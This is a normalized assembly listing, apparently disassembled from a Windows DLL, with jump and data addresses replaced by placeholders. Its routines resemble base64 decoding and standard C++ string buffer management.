lea rcx [ rw-data ]
call sub_180002720
test rax rax
je r-xdata
mov eax [ rsp + 0x34 ]
shr eax 0x10
and eax 0xff
mov rcx [ rsp + 0x28 ]
mov [ rcx ] al
mov rax [ rsp + 0x28 ]
add rax 0x1
mov [ rsp + 0x28 ] rax
cmp [ rsp + 0x30 ] 0x2
jae r-xdata
mov eax 0xffffffff
jmp r-xdata
cmp [ rsp + 0x30 ] 0x1
jae r-xdata
mov eax [ rsp + 0x34 ]
shr eax 0x8
and eax 0xff
mov rcx [ rsp + 0x28 ]
mov [ rcx ] al
mov rax [ rsp + 0x28 ]
add rax 0x1
mov [ rsp + 0x28 ] rax
add rsp 0x48
retn
jmp r-xdata
mov eax [ rsp + 0x34 ]
and eax 0xff
mov rcx [ rsp + 0x28 ]
mov [ rcx ] al
mov rax [ rsp + 0x28 ]
add rax 0x1
mov [ rsp + 0x28 ] rax
mov rax [ rsp + 0x20 ]
add rax 0x4
mov [ rsp + 0x20 ] rax
sub_1800025f0
mov [ rsp + 0x8 ] rcx
sub rsp 0x38
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] 0x0
mov rcx [ rsp + 0x40 ]
call sub_1800071b0
cmp rax 0x4
jae r-xdata
mov [ rsp + 0x24 ] 0x0
jmp r-xdata
mov eax 0xffffffff
jmp r-xdata
cmp [ rsp + 0x24 ] 0x4
jge r-xdata
add rsp 0x38
retn
cmp [ rsp + 0x20 ] 0x2
jle r-xdata
mov eax [ rsp + 0x28 ]
imul eax eax 0x40
mov [ rsp + 0x28 ] eax
movsxd rax [ rsp + 0x24 ]
mov rcx [ rsp + 0x40 ]
movsx eax [ rcx + rax ]
cmp eax 0x3d
jne r-xdata
mov eax [ rsp + 0x20 ]
shl eax 0x18
or eax [ rsp + 0x28 ]
mov eax 0xffffffff
jmp r-xdata
cmp [ rsp + 0x20 ] 0x0
jle r-xdata
mov eax [ rsp + 0x20 ]
add eax 0x1
mov [ rsp + 0x20 ] eax
jmp r-xdata
movsxd rax [ rsp + 0x24 ]
mov rcx [ rsp + 0x40 ]
movzx ecx [ rcx + rax ]
call sub_1800026c0
mov ecx [ rsp + 0x28 ]
add ecx eax
mov eax ecx
mov [ rsp + 0x28 ] eax
mov eax 0xffffffff
jmp r-xdata
jmp r-xdata
mov eax [ rsp + 0x24 ]
add eax 0x1
mov [ rsp + 0x24 ] eax
sub_1800026c0
mov [ rsp + 0x8 ] cl
sub rsp 0x18
lea rax [ rw-data ]
mov [ rsp ] rax
jmp r-xdata
mov rax [ rsp ]
movsx eax [ rax ]
test eax eax
je r-xdata
mov eax 0xffffffff
mov rax [ rsp ]
movsx eax [ rax ]
movsx ecx [ rsp + 0x20 ]
cmp eax ecx
jne r-xdata
jmp r-xdata
lea rax [ rw-data ]
mov rcx [ rsp ]
sub rcx rax
mov rax rcx
jmp r-xdata
mov rax [ rsp ]
add rax 0x1
mov [ rsp ] rax
add rsp 0x18
retn
sub_180002740
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x38
lea rax [ rsp + 0x20 ]
mov [ rsp + 0x28 ] rax
mov rcx [ rsp + 0x28 ]
call sub_180002aa0
mov rdx rax
mov rcx [ rsp + 0x40 ]
call sub_180002a70
xor r8d r8d
xor edx edx
mov rcx [ rsp + 0x40 ]
call sub_1800029d0
mov rdx [ rsp + 0x48 ]
mov rcx [ rsp + 0x40 ]
call sub_1800029a0
mov rax [ rsp + 0x40 ]
add rsp 0x38
retn
sub_1800027a0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_180002a70
xor r8d r8d
xor edx edx
mov rcx [ rsp + 0x30 ]
call sub_1800029d0
mov r9 [ r--data ]
xor r8d r8d
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_180002890
mov rax [ rsp + 0x30 ]
add rsp 0x28
retn
sub_180002890
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x38
mov rcx [ rsp + 0x48 ]
call sub_1800035a0
cmp rax [ rsp + 0x50 ]
jae r-xdata
mov rcx [ rsp + 0x48 ]
call sub_1800035a0
sub rax [ rsp + 0x50 ]
mov [ rsp + 0x20 ] rax
mov rax [ rsp + 0x20 ]
cmp [ rsp + 0x58 ] rax
jae r-xdata
call sub_180005800
mov rax [ rsp + 0x48 ]
cmp [ rsp + 0x40 ] rax
jne r-xdata
mov rax [ rsp + 0x58 ]
mov [ rsp + 0x20 ] rax
xor r8d r8d
mov rdx [ rsp + 0x20 ]
mov rcx [ rsp + 0x40 ]
call sub_180002ce0
movzx eax al
test eax eax
je r-xdata
mov rax [ rsp + 0x20 ]
mov rcx [ rsp + 0x50 ]
add rcx rax
mov rax rcx
mov r8 [ r--data ]
mov rdx rax
mov rcx [ rsp + 0x40 ]
call sub_180002b70
mov r8 [ rsp + 0x50 ]
xor edx edx
mov rcx [ rsp + 0x40 ]
call sub_180002b70
jmp r-xdata
mov rax [ rsp + 0x40 ]
add rsp 0x38
retn
mov rcx [ rsp + 0x48 ]
call sub_180002dc0
mov rcx [ rsp + 0x50 ]
lea rax [ rax + rcx * 2 ]
mov [ rsp + 0x28 ] rax
mov rcx [ rsp + 0x40 ]
call sub_180002dc0
mov r9 [ rsp + 0x20 ]
mov rcx [ rsp + 0x28 ]
mov r8 rcx
mov rcx [ rsp + 0x40 ]
mov rdx [ rcx + 0x20 ]
mov rcx rax
call sub_180003e10
mov rdx [ rsp + 0x20 ]
mov rcx [ rsp + 0x40 ]
call sub_180002c90
sub_1800029d0
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] dl
mov [ rsp + 0x8 ] rcx
sub rsp 0x38
movzx eax [ rsp + 0x48 ]
test eax eax
jne r-xdata
mov rax [ rsp + 0x40 ]
cmp [ rax + 0x20 ] 0x8
jb r-xdata
jmp r-xdata
mov rax [ rsp + 0x40 ]
mov [ rax + 0x20 ] 0x7
mov rdx [ rsp + 0x50 ]
mov rcx [ rsp + 0x40 ]
call sub_180002c90
add rsp 0x38
retn
mov rax [ rsp + 0x40 ]
mov rax [ rax + 0x8 ]
mov [ rsp + 0x20 ] rax
cmp [ rsp + 0x50 ] 0x0
jbe r-xdata
mov rax [ rsp + 0x40 ]
mov rax [ rax + 0x20 ]
add rax 0x1
mov r8 rax
mov rdx [ rsp + 0x20 ]
mov rcx [ rsp + 0x40 ]
call sub_180003a00
mov rax [ rsp + 0x40 ]
add rax 0x8
mov r9 [ rsp + 0x50 ]
mov r8 [ rsp + 0x20 ]
mov edx 0x8
mov rcx rax
call sub_180003e10
sub_180002ab0
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_180003060
movzx eax al
test eax eax
je r-xdata
xor r8d r8d
mov rdx [ rsp + 0x40 ]
mov rcx [ rsp + 0x30 ]
call sub_180002ce0
movzx eax al
test eax eax
je r-xdata
mov rcx [ rsp + 0x30 ]
call sub_180002dc0
mov rcx [ rsp + 0x38 ]
sub rcx rax
mov rax rcx
sar rax 0x1
mov r9 [ rsp + 0x40 ]
mov r8 rax
mov rdx [ rsp + 0x30 ]
mov rcx [ rsp + 0x30 ]
call sub_180002890
jmp r-xdata
mov rax [ rsp + 0x30 ]
mov rcx [ rsp + 0x30 ]
call sub_180002dc0
mov r9 [ rsp + 0x40 ]
mov r8 [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
mov rdx [ rcx + 0x20 ]
mov rcx rax
call sub_180003e10
mov rdx [ rsp + 0x40 ]
mov rcx [ rsp + 0x30 ]
call sub_180002c90
add rsp 0x28
retn
sub_180002b70
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x48
mov rax [ rsp + 0x50 ]
mov rcx [ rsp + 0x58 ]
cmp [ rax + 0x18 ] rcx
jae r-xdata
mov rax [ rsp + 0x50 ]
mov rcx [ rsp + 0x58 ]
mov rax [ rax + 0x18 ]
sub rax rcx
cmp rax [ rsp + 0x60 ]
jae r-xdata
call sub_180005800
cmp [ rsp + 0x60 ] 0x0
jbe r-xdata
mov rax [ rsp + 0x50 ]
mov rcx [ rsp + 0x58 ]
mov rax [ rax + 0x18 ]
sub rax rcx
mov [ rsp + 0x60 ] rax
mov rax [ rsp + 0x50 ]
add rsp 0x48
retn
mov rax [ rsp + 0x50 ]
mov rcx [ rsp + 0x58 ]
mov rax [ rax + 0x18 ]
sub rax rcx
sub rax [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov rcx [ rsp + 0x50 ]
call sub_180002dc0
mov rcx [ rsp + 0x58 ]
lea rax [ rax + rcx * 2 ]
mov rcx [ rsp + 0x60 ]
lea rax [ rax + rcx * 2 ]
mov [ rsp + 0x30 ] rax
mov rcx [ rsp + 0x50 ]
mov rdx [ rsp + 0x58 ]
mov rcx [ rcx + 0x20 ]
sub rcx rdx
mov [ rsp + 0x38 ] rcx
mov rcx [ rsp + 0x50 ]
call sub_180002dc0
mov rcx [ rsp + 0x58 ]
lea rax [ rax + rcx * 2 ]
mov rcx [ rsp + 0x28 ]
mov r9 rcx
mov rcx [ rsp + 0x30 ]
mov r8 rcx
mov rcx [ rsp + 0x38 ]
mov rdx rcx
mov rcx rax
call sub_180003110
mov rax [ rsp + 0x50 ]
mov rcx [ rsp + 0x60 ]
mov rax [ rax + 0x18 ]
sub rax rcx
mov [ rsp + 0x20 ] rax
mov rdx [ rsp + 0x20 ]
mov rcx [ rsp + 0x50 ]
call sub_180002c90
sub_180002c90
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x38
mov [ rsp + 0x20 ] 0x0
mov rax [ rsp + 0x40 ]
mov rcx [ rsp + 0x48 ]
mov [ rax + 0x18 ] rcx
mov rcx [ rsp + 0x40 ]
call sub_180002dc0
mov rcx [ rsp + 0x48 ]
lea rax [ rax + rcx * 2 ]
lea rdx [ rsp + 0x20 ]
mov rcx rax
call sub_180003220
add rsp 0x38
retn
sub_180002ce0
mov [ rsp + 0x18 ] r8b
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x38
mov rcx [ rsp + 0x40 ]
call sub_180002e00
cmp rax [ rsp + 0x48 ]
jae r-xdata
mov rax [ rsp + 0x40 ]
mov rcx [ rsp + 0x48 ]
cmp [ rax + 0x20 ] rcx
jae r-xdata
call sub_180005610
movzx eax [ rsp + 0x50 ]
test eax eax
je r-xdata
mov rax [ rsp + 0x40 ]
mov r8 [ rax + 0x18 ]
mov rdx [ rsp + 0x48 ]
mov rcx [ rsp + 0x40 ]
call sub_180002e50
jmp r-xdata
cmp [ rsp + 0x48 ] 0x0
jne r-xdata
cmp [ rsp + 0x48 ] 0x8
jae r-xdata
cmp [ rsp + 0x48 ] 0x0
jbe r-xdata
xor edx edx
mov rcx [ rsp + 0x40 ]
call sub_180002c90
mov rax [ rsp + 0x40 ]
mov rax [ rax + 0x18 ]
cmp [ rsp + 0x48 ] rax
jae r-xdata
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x28 ] 0x1
jmp r-xdata
mov rax [ rsp + 0x40 ]
mov rax [ rax + 0x18 ]
mov [ rsp + 0x20 ] rax
mov rax [ rsp + 0x48 ]
mov [ rsp + 0x20 ] rax
jmp r-xdata
mov al [ rsp + 0x28 ]
add rsp 0x38
retn
mov r8 [ rsp + 0x20 ]
mov dl 0x1
mov rcx [ rsp + 0x40 ]
call sub_1800029d0
jmp r-xdata
sub_180002dc0
mov [ rsp + 0x8 ] rcx
sub rsp 0x18
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x20 ] 0x8
jb r-xdata
mov rax [ rsp + 0x20 ]
add rax 0x8
mov [ rsp ] rax
mov rax [ rsp + 0x20 ]
mov rax [ rax + 0x8 ]
mov [ rsp ] rax
jmp r-xdata
mov rax [ rsp ]
add rsp 0x18
retn
sub_180002e00
mov [ rsp + 0x8 ] rcx
sub rsp 0x38
mov rcx [ rsp + 0x40 ]
call sub_1800030d0
mov [ rsp + 0x20 ] rax
cmp [ rsp + 0x20 ] 0x1
ja r-xdata
mov rax [ rsp + 0x20 ]
sub rax 0x1
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x28 ] 0x1
jmp r-xdata
mov rax [ rsp + 0x28 ]
add rsp 0x38
retn
sub_180002e50
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x68
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov rax [ rsp + 0x78 ]
or rax 0x7
mov [ rsp + 0x28 ] rax
mov rcx [ rsp + 0x70 ]
call sub_180002e00
cmp rax [ rsp + 0x28 ]
jae r-xdata
xor edx edx
mov rax [ rsp + 0x70 ]
mov rax [ rax + 0x20 ]
mov ecx 0x2
div rcx
mov [ rsp + 0x38 ] rax
xor edx edx
mov rax [ rsp + 0x28 ]
mov ecx 0x3
div rcx
mov rcx [ rsp + 0x38 ]
cmp rax rcx
jae r-xdata
mov rax [ rsp + 0x78 ]
mov [ rsp + 0x28 ] rax
jmp r-xdata
mov [ rsp + 0x20 ] 0x0
mov rax [ rsp + 0x28 ]
add rax 0x1
mov rdx rax
mov rcx [ rsp + 0x70 ]
call sub_1800030b0
mov [ rsp + 0x48 ] rax
mov rax [ rsp + 0x48 ]
mov [ rsp + 0x20 ] rax
cmp [ rsp + 0x80 ] 0x0
jbe r-xdata
xor edx edx
mov rax [ rsp + 0x70 ]
mov rax [ rax + 0x20 ]
mov ecx 0x2
div rcx
mov [ rsp + 0x40 ] rax
mov rcx [ rsp + 0x70 ]
call sub_180002e00
mov rcx [ rsp + 0x40 ]
sub rax rcx
mov rcx [ rsp + 0x70 ]
cmp [ rcx + 0x20 ] rax
ja r-xdata
xor r8d r8d
mov dl 0x1
mov rcx [ rsp + 0x70 ]
call sub_1800029d0
mov rax [ rsp + 0x70 ]
mov rcx [ rsp + 0x20 ]
mov [ rax + 0x8 ] rcx
mov rax [ rsp + 0x70 ]
mov rcx [ rsp + 0x28 ]
mov [ rax + 0x20 ] rcx
mov rdx [ rsp + 0x80 ]
mov rcx [ rsp + 0x70 ]
call sub_180002c90
add rsp 0x68
retn
mov rcx [ rsp + 0x70 ]
call sub_180002dc0
mov rcx [ rsp + 0x28 ]
add rcx 0x1
mov r9 [ rsp + 0x80 ]
mov r8 rax
mov rdx rcx
mov rcx [ rsp + 0x20 ]
call sub_180003e10
xor edx edx
mov rax [ rsp + 0x70 ]
mov rax [ rax + 0x20 ]
mov ecx 0x2
div rcx
mov rcx [ rsp + 0x70 ]
add rax [ rcx + 0x20 ]
mov [ rsp + 0x28 ] rax
sub_180002fd0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rbp + 0x78 ]
mov [ rbp + 0x28 ] rax
mov rax [ rbp + 0x28 ]
add rax 0x1
mov rdx rax
mov rcx [ rbp + 0x70 ]
call sub_1800030b0
mov [ rbp + 0x50 ] rax
mov rax [ rbp + 0x50 ]
mov [ rbp + 0x20 ] rax
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_180003020
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
xor r8d r8d
mov dl 0x1
mov rcx [ rbp + 0x70 ]
call sub_1800029d0
xor edx edx
xor ecx ecx
call sub_180007410
nop
lea rax [ r-xdata ]
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_180003060
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rcx [ rsp + 0x30 ]
call sub_180002dc0
cmp [ rsp + 0x38 ] rax
jb r-xdata
xor al al
jmp r-xdata
mov rcx [ rsp + 0x30 ]
call sub_180002dc0
mov rcx [ rsp + 0x30 ]
mov rcx [ rcx + 0x18 ]
lea rax [ rax + rcx * 2 ]
cmp rax [ rsp + 0x38 ]
ja r-xdata
add rsp 0x28
retn
mov al 0x1
sub_1800030d0
mov [ rsp + 0x8 ] rcx
sub rsp 0x18
mov rax 0x7fffffffffffffff
mov [ rsp ] rax
cmp [ rsp ] 0x0
jbe r-xdata
mov [ rsp + 0x8 ] 0x1
mov rax [ rsp ]
mov [ rsp + 0x8 ] rax
jmp r-xdata
mov rax [ rsp + 0x8 ]
add rsp 0x18
retn
sub_180003110
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x48
call sub_180003160
mov [ rsp + 0x30 ] al
movzx eax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] al
mov r9 [ rsp + 0x68 ]
mov r8 [ rsp + 0x60 ]
mov rdx [ rsp + 0x58 ]
mov rcx [ rsp + 0x50 ]
call sub_1800031e0
add rsp 0x48
retn
sub_180003170
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x48
cmp [ rsp + 0x50 ] 0x0
ja r-xdata
xor edx edx
mov rax 0xffffffffffffffff
div [ rsp + 0x50 ]
cmp rax 0x2
jae r-xdata
mov [ rsp + 0x50 ] 0x0
jmp r-xdata
mov rax [ rsp + 0x50 ]
shl rax 0x1
mov rcx rax
call sub_1800074e0
add rsp 0x48
retn
xor edx edx
lea rcx [ rsp + 0x20 ]
call sub_1800032f0
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
call sub_180007410
sub_180003260
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov r9 [ rsp + 0x48 ]
mov r8 [ rsp + 0x40 ]
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_1800032a0
mov rax [ rsp + 0x30 ]
add rsp 0x28
retn
sub_1800032a0
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rax [ rsp + 0x48 ]
shl rax 0x1
mov rcx [ rsp + 0x38 ]
shl rcx 0x1
mov r9 rax
mov r8 [ rsp + 0x40 ]
mov rdx rcx
mov rcx [ rsp + 0x30 ]
call sub_180007830
add rsp 0x28
retn
sub_180003360
mov [ rsp + 0x10 ] edx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rcx [ rsp + 0x30 ]
call sub_180003330
mov eax [ rsp + 0x38 ]
and eax 0x1
test eax eax
je r-xdata
mov rax [ rsp + 0x30 ]
add rsp 0x28
retn
mov rcx [ rsp + 0x30 ]
call j_sub_1800085f0#2
sub_1800033a0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x38
lea rax [ rsp + 0x20 ]
mov [ rsp + 0x28 ] rax
mov rcx [ rsp + 0x28 ]
call sub_180002aa0
mov rdx rax
mov rcx [ rsp + 0x40 ]
call sub_180002a70
xor r8d r8d
xor edx edx
mov rcx [ rsp + 0x40 ]
call sub_180003600
mov rdx [ rsp + 0x48 ]
mov rcx [ rsp + 0x40 ]
call sub_1800035b0
mov rax [ rsp + 0x40 ]
add rsp 0x38
retn
sub_180003400
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_180002a70
xor r8d r8d
xor edx edx
mov rcx [ rsp + 0x30 ]
call sub_180003600
mov r9 [ r--data ]
xor r8d r8d
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_180003490
mov rax [ rsp + 0x30 ]
add rsp 0x28
retn
sub_180003490
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x38
mov rcx [ rsp + 0x48 ]
call sub_1800035a0
cmp rax [ rsp + 0x50 ]
jae r-xdata
mov rcx [ rsp + 0x48 ]
call sub_1800035a0
sub rax [ rsp + 0x50 ]
mov [ rsp + 0x20 ] rax
mov rax [ rsp + 0x20 ]
cmp [ rsp + 0x58 ] rax
jae r-xdata
call sub_180005800
mov rax [ rsp + 0x48 ]
cmp [ rsp + 0x40 ] rax
jne r-xdata
mov rax [ rsp + 0x58 ]
mov [ rsp + 0x20 ] rax
xor r8d r8d
mov rdx [ rsp + 0x20 ]
mov rcx [ rsp + 0x40 ]
call sub_1800038d0
movzx eax al
test eax eax
je r-xdata
mov rax [ rsp + 0x20 ]
mov rcx [ rsp + 0x50 ]
add rcx rax
mov rax rcx
mov r8 [ r--data ]
mov rdx rax
mov rcx [ rsp + 0x40 ]
call sub_180003750
mov r8 [ rsp + 0x50 ]
xor edx edx
mov rcx [ rsp + 0x40 ]
call sub_180003750
jmp r-xdata
mov rax [ rsp + 0x40 ]
add rsp 0x38
retn
mov rcx [ rsp + 0x48 ]
call sub_1800039b0
add rax [ rsp + 0x50 ]
mov [ rsp + 0x28 ] rax
mov rcx [ rsp + 0x40 ]
call sub_1800039b0
mov r9 [ rsp + 0x20 ]
mov rcx [ rsp + 0x28 ]
mov r8 rcx
mov rcx [ rsp + 0x40 ]
mov rdx [ rcx + 0x20 ]
mov rcx rax
call sub_180003d40
mov rdx [ rsp + 0x20 ]
mov rcx [ rsp + 0x40 ]
call sub_180003860
sub_180003600
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] dl
mov [ rsp + 0x8 ] rcx
sub rsp 0x38
movzx eax [ rsp + 0x48 ]
test eax eax
jne r-xdata
mov rax [ rsp + 0x40 ]
cmp [ rax + 0x20 ] 0x10
jb r-xdata
jmp r-xdata
mov rax [ rsp + 0x40 ]
mov [ rax + 0x20 ] 0xf
mov rdx [ rsp + 0x50 ]
mov rcx [ rsp + 0x40 ]
call sub_180003860
add rsp 0x38
retn
mov rax [ rsp + 0x40 ]
mov rax [ rax + 0x8 ]
mov [ rsp + 0x20 ] rax
cmp [ rsp + 0x50 ] 0x0
jbe r-xdata
mov rax [ rsp + 0x40 ]
mov rax [ rax + 0x20 ]
add rax 0x1
mov r8 rax
mov rdx [ rsp + 0x20 ]
mov rcx [ rsp + 0x40 ]
call sub_180003a00
mov rax [ rsp + 0x40 ]
add rax 0x8
mov r9 [ rsp + 0x50 ]
mov r8 [ rsp + 0x20 ]
mov edx 0x10
mov rcx rax
call sub_180003d40
sub_1800036a0
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
call sub_180003c90
movzx eax al
test eax eax
je r-xdata
xor r8d r8d
mov rdx [ rsp + 0x40 ]
mov rcx [ rsp + 0x30 ]
call sub_1800038d0
movzx eax al
test eax eax
je r-xdata
mov rcx [ rsp + 0x30 ]
call sub_1800039b0
mov rcx [ rsp + 0x38 ]
sub rcx rax
mov rax rcx
mov r9 [ rsp + 0x40 ]
mov r8 rax
mov rdx [ rsp + 0x30 ]
mov rcx [ rsp + 0x30 ]
call sub_180003490
jmp r-xdata
mov rax [ rsp + 0x30 ]
mov rcx [ rsp + 0x30 ]
call sub_1800039b0
mov r9 [ rsp + 0x40 ]
mov r8 [ rsp + 0x38 ]
mov rcx [ rsp + 0x30 ]
mov rdx [ rcx + 0x20 ]
mov rcx rax
call sub_180003d40
mov rdx [ rsp + 0x40 ]
mov rcx [ rsp + 0x30 ]
call sub_180003860
add rsp 0x28
retn
sub_180003750
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x48
mov rax [ rsp + 0x50 ]
mov rcx [ rsp + 0x58 ]
cmp [ rax + 0x18 ] rcx
jae r-xdata
mov rax [ rsp + 0x50 ]
mov rcx [ rsp + 0x58 ]
mov rax [ rax + 0x18 ]
sub rax rcx
cmp rax [ rsp + 0x60 ]
jae r-xdata
call sub_180005800
cmp [ rsp + 0x60 ] 0x0
jbe r-xdata
mov rax [ rsp + 0x50 ]
mov rcx [ rsp + 0x58 ]
mov rax [ rax + 0x18 ]
sub rax rcx
mov [ rsp + 0x60 ] rax
mov rax [ rsp + 0x50 ]
add rsp 0x48
retn
mov rax [ rsp + 0x50 ]
mov rcx [ rsp + 0x58 ]
mov rax [ rax + 0x18 ]
sub rax rcx
sub rax [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov rcx [ rsp + 0x50 ]
call sub_1800039b0
add rax [ rsp + 0x58 ]
add rax [ rsp + 0x60 ]
mov [ rsp + 0x30 ] rax
mov rcx [ rsp + 0x50 ]
mov rdx [ rsp + 0x58 ]
mov rcx [ rcx + 0x20 ]
sub rcx rdx
mov [ rsp + 0x38 ] rcx
mov rcx [ rsp + 0x50 ]
call sub_1800039b0
add rax [ rsp + 0x58 ]
mov rcx [ rsp + 0x28 ]
mov r9 rcx
mov rcx [ rsp + 0x30 ]
mov r8 rcx
mov rcx [ rsp + 0x38 ]
mov rdx rcx
mov rcx rax
call sub_180003f30
mov rax [ rsp + 0x50 ]
mov rcx [ rsp + 0x60 ]
mov rax [ rax + 0x18 ]
sub rax rcx
mov [ rsp + 0x20 ] rax
mov rdx [ rsp + 0x20 ]
mov rcx [ rsp + 0x50 ]
call sub_180003860
sub_180003860
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x38
mov [ rsp + 0x20 ] 0x0
mov rax [ rsp + 0x40 ]
mov rcx [ rsp + 0x48 ]
mov [ rax + 0x18 ] rcx
mov rcx [ rsp + 0x40 ]
call sub_1800039b0
add rax [ rsp + 0x48 ]
lea rdx [ rsp + 0x20 ]
mov rcx rax
call sub_1800038b0
add rsp 0x38
retn
sub_1800038d0
mov [ rsp + 0x18 ] r8b
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x38
mov rcx [ rsp + 0x40 ]
call sub_180003a30
cmp rax [ rsp + 0x48 ]
jae r-xdata
mov rax [ rsp + 0x40 ]
mov rcx [ rsp + 0x48 ]
cmp [ rax + 0x20 ] rcx
jae r-xdata
call sub_180005610
movzx eax [ rsp + 0x50 ]
test eax eax
je r-xdata
mov rax [ rsp + 0x40 ]
mov r8 [ rax + 0x18 ]
mov rdx [ rsp + 0x48 ]
mov rcx [ rsp + 0x40 ]
call sub_180003a80
jmp r-xdata
cmp [ rsp + 0x48 ] 0x0
jne r-xdata
cmp [ rsp + 0x48 ] 0x10
jae r-xdata
cmp [ rsp + 0x48 ] 0x0
jbe r-xdata
xor edx edx
mov rcx [ rsp + 0x40 ]
call sub_180003860
mov rax [ rsp + 0x40 ]
mov rax [ rax + 0x18 ]
cmp [ rsp + 0x48 ] rax
jae r-xdata
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x28 ] 0x1
jmp r-xdata
mov rax [ rsp + 0x40 ]
mov rax [ rax + 0x18 ]
mov [ rsp + 0x20 ] rax
mov rax [ rsp + 0x48 ]
mov [ rsp + 0x20 ] rax
jmp r-xdata
mov al [ rsp + 0x28 ]
add rsp 0x38
retn
mov r8 [ rsp + 0x20 ]
mov dl 0x1
mov rcx [ rsp + 0x40 ]
call sub_180003600
jmp r-xdata
sub_1800039b0
mov [ rsp + 0x8 ] rcx
sub rsp 0x18
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x20 ] 0x10
jb r-xdata
mov rax [ rsp + 0x20 ]
add rax 0x8
mov [ rsp ] rax
mov rax [ rsp + 0x20 ]
mov rax [ rax + 0x8 ]
mov [ rsp ] rax
jmp r-xdata
mov rax [ rsp ]
add rsp 0x18
retn
sub_180003a30
mov [ rsp + 0x8 ] rcx
sub rsp 0x38
mov rcx [ rsp + 0x40 ]
call sub_180003d00
mov [ rsp + 0x20 ] rax
cmp [ rsp + 0x20 ] 0x1
ja r-xdata
mov rax [ rsp + 0x20 ]
sub rax 0x1
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x28 ] 0x1
jmp r-xdata
mov rax [ rsp + 0x28 ]
add rsp 0x38
retn
sub_180003a80
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x68
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov rax [ rsp + 0x78 ]
or rax 0xf
mov [ rsp + 0x28 ] rax
mov rcx [ rsp + 0x70 ]
call sub_180003a30
cmp rax [ rsp + 0x28 ]
jae r-xdata
xor edx edx
mov rax [ rsp + 0x70 ]
mov rax [ rax + 0x20 ]
mov ecx 0x2
div rcx
mov [ rsp + 0x38 ] rax
xor edx edx
mov rax [ rsp + 0x28 ]
mov ecx 0x3
div rcx
mov rcx [ rsp + 0x38 ]
cmp rax rcx
jae r-xdata
mov rax [ rsp + 0x78 ]
mov [ rsp + 0x28 ] rax
jmp r-xdata
mov [ rsp + 0x20 ] 0x0
mov rax [ rsp + 0x28 ]
add rax 0x1
mov rdx rax
mov rcx [ rsp + 0x70 ]
call sub_180003ce0
mov [ rsp + 0x48 ] rax
mov rax [ rsp + 0x48 ]
mov [ rsp + 0x20 ] rax
cmp [ rsp + 0x80 ] 0x0
jbe r-xdata
xor edx edx
mov rax [ rsp + 0x70 ]
mov rax [ rax + 0x20 ]
mov ecx 0x2
div rcx
mov [ rsp + 0x40 ] rax
